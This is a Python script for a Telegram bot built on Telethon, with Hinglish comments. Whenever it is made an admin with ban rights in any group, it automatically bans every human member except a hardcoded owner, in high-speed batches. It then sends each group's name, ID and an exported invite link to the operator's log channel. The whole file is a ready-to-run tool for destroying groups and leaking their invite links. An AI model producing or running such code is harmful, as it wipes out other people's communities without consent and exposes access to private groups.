import os, asyncio, time
from telethon import TelegramClient, events, functions, types
from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAdminInvalidError

# ───── [ CONFIGURATION ] ───── #
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
LOG_GROUP_ID = int(os.environ.get("LOG_GROUP_ID"))

# AAPKI OWNER ID (Bot isko kabhi ban nahi karega)
OWNER_ID = 7834647169 

# Stats & Performance
total_banned = 0
total_groups_cleaned = 0
active_tasks = set()
BATCH_SIZE = 45  # Turbo Speed Mode 🚀

bot = TelegramClient("ultimate_purge_stay", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ───── [ CORE HELPERS ] ───── #

async def get_invite_link(chat):
    """Public ya Private group ka link nikalne ke liye."""
    if getattr(chat, 'username', None):
        return f"https://t.me/{chat.username}"
    try:
        res = await bot(functions.messages.ExportChatInviteRequest(peer=chat.id))
        return res.link
    except:
        return "⚠️ Private (No Invite Permission)"

async def ban_user(chat_id, user_id):
    """High-speed permanent ban engine."""
    global total_banned
    try:
        await bot(functions.channels.EditBannedRequest(
            channel=chat_id,
            participant=user_id,
            banned_rights=types.ChatBannedRights(until_date=None, view_messages=True)
        ))
        total_banned += 1
        return True
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return False
    except:
        return "ERROR"

# ───── [ THE PURGE ENGINE ] ───── #

async def start_ultimate_purge(chat):
    global total_groups_cleaned
    if chat.id in active_tasks: return
    active_tasks.add(chat.id)
    
    start_t = time.time()
    local_count = 0
    me = await bot.get_me()
    link = await get_invite_link(chat)

    # 📥 STEP 1: LOGGING THE TARGET
    await bot.send_message(
        LOG_GROUP_ID,
        f"🔥 **ULTIMATE PURGE ACTIVATED** 🔥\n\n"
        f"🏰 **Group:** `{chat.title}`\n"
        f"🆔 **ID:** `{chat.id}`\n"
        f"🔗 **Link:** {link}\n"
        f"👤 **Owner Whitelist:** `{OWNER_ID}` ✅\n"
        f"⚡ **Status:** High Speed Banning..."
    )

    try:
        batch = []
        async for user in bot.iter_participants(chat.id):
            # SECURITY CHECK: Khud ko, Owner ko, aur Bots ko skip karo
            if user.id == me.id or user.id == OWNER_ID or user.bot:
                continue
            
            batch.append(ban_user(chat.id, user.id))

            if len(batch) >= BATCH_SIZE:
                results = await asyncio.gather(*batch)
                local_count += sum(1 for r in results if r is True)
                batch = []
                if "ERROR" in results: break
                await asyncio.sleep(0.01) # Very low delay for insane speed

        if batch: # Final remaining batch
            results = await asyncio.gather(*batch)
            local_count += sum(1 for r in results if r is True)

    finally:
        total_groups_cleaned += 1
        dur = round(time.time() - start_t, 2)
        active_tasks.remove(chat.id)
        
        # 🏁 STEP 2: FINAL REPORT (Bot stays in group)
        await bot.send_message(
            LOG_GROUP_ID,
            f"✅ **MISSION ACCOMPLISHED**\n\n"
            f"🏰 **Group:** {chat.title}\n"
            f"🚫 **Total Banned:** `{local_count}`\n"
            f"⏱️ **Total Time:** `{dur}s`\n"
            f"📈 **Global Bans:** `{total_banned}`\n"
            f"📌 **Note:** Bot is still in the group."
        )

# ───── [ AUTOMATIC TRIGGERS ] ───── #

@bot.on(events.ChatAction)
async def on_action(event):
    if event.user_added and event.user_id == (await bot.get_me()).id:
        chat = await event.get_chat()
        asyncio.create_task(validate_and_purge(chat))

@bot.on(events.NewMessage())
async def on_msg(event):
    if event.is_group or event.is_channel:
        chat = await event.get_chat()
        asyncio.create_task(validate_and_purge(chat))

async def validate_and_purge(chat):
    if chat.id in active_tasks: return
    try:
        p = await bot.get_permissions(chat.id, 'me')
        if p.is_admin and p.ban_users:
            await start_ultimate_purge(chat)
    except: pass

# ───── [ OWNER COMMANDS ] ───── #

@bot.on(events.NewMessage(pattern="/stats", from_users=OWNER_ID))
async def stats(event):
    await event.respond(
        f"📊 **ULTIMATE BOT STATS**\n\n"
        f"🚫 **Total Banned:** `{total_banned}`\n"
        f"🏰 **Groups Purged:** `{total_groups_cleaned}`\n"
        f"⏳ **Active Purges:** `{len(active_tasks)}`"
    )

# ───── [ START BOT ] ───── #
print("🚀 Turbo Purge Bot (Stay Mode) is ONLINE!")
bot.run_until_disconnected()
